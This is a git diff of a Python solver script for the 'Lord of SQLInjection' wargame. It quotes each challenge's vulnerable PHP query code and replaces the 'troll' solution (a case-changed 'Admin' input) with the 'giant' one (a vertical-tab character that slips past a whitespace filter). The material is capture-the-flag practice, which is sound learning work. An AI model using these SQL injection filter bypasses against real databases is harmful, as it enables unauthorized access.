@@ -6,17 +6,17 @@ from getpass import getpass
 
 def main():
     '''
-    Troll
+    Giant
 
-    if(preg_match('/\'/i', $_GET[id])) exit("No Hack ~_~");
-    if(preg_match("/admin/", $_GET[id])) exit("HeHe");
-    $query = "select id from prob_troll where id='{$_GET[id]}'";
-    echo "<hr>query : <strong>{$query}</strong><hr><br>";
-    $result = @mysqli_fetch_array(mysqli_query($db,$query));
-    if($result['id'] == 'admin') solve("troll");
+    if(strlen($_GET[shit])>1) exit("No Hack ~_~"); 
+    if(preg_match('/ |\n|\r|\t/i', $_GET[shit])) exit("HeHe"); 
+    $query = "select 1234 from{$_GET[shit]}prob_giant where 1"; 
+    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
+    $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
+    if($result[1234]) solve("giant"); 
     '''
 
-    url = "https://los.rubiya.kr/chall/troll_05b5eb65d94daf81c42dd44136cb0063.php"
+    url = "https://los.rubiya.kr/chall/giant_18a08c3be1d1753de0cb157703f75a5e.php"
 
     try:
         with open('cooks.pickle', 'rb') as f:
@@ -29,12 +29,12 @@ def main():
         print('you need to login in browser')
         exit(1)
 
-    param = dict(id="Admin")
+    param = dict(shit="\v")
 
     response = los.get_request(url, param, cook)
 
     if 'Clear!' in response:
-        print('TROLL Clear!')
+        print('Giant Clear!')
 
     # Save cookie
     los.save_cookies(cook)
